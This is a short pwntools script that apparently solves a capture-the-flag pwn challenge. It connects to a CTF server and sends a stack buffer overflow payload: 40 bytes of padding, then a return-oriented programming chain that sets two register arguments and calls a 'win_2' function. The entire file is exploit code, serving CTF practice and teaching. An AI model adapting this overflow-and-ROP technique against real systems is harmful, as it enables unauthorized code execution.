from pwn import *

target = remote("pwn.katagaitai-ctf.com", 9012)

win_2 = 0x4014b2
pop_rdi = 0x401693
pop_rsi = 0x401691

payload = b"A" * 40
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi)
payload += p64(0xcafebabe)
payload += p64(0x0)
payload += p64(win_2)

target.sendline(payload)
print(target.recvall().decode())